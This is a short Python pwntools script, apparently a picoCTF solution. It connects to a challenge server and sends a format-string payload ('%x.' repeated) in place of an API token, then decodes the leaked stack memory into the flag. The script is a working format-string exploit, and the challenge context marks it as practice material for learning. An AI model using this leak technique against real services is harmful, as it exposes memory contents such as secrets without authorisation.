#! /usr/bin/env python3
from pwn import *



host = 'mercury.picoctf.net'
port = 59616

p = remote(host,port)


p.recvuntil('2) View my portfolio\n')
p.sendline('1')
pause(1)
p.recvuntil("What is your API token?\n")
p.sendline(b'%x.'*100)
p.recvuntil("Buying stonks with token:\n")
leak = p.recvline().decode("utf-8")
leak = leak.split(".")


flag=''
for plain_text in leak:
  #check if it can be converted to ascii
  try:
    plain_text = bytearray.fromhex(plain_text).decode()[::-1]
    flag += plain_text 
  except:
    continue 

print (flag)
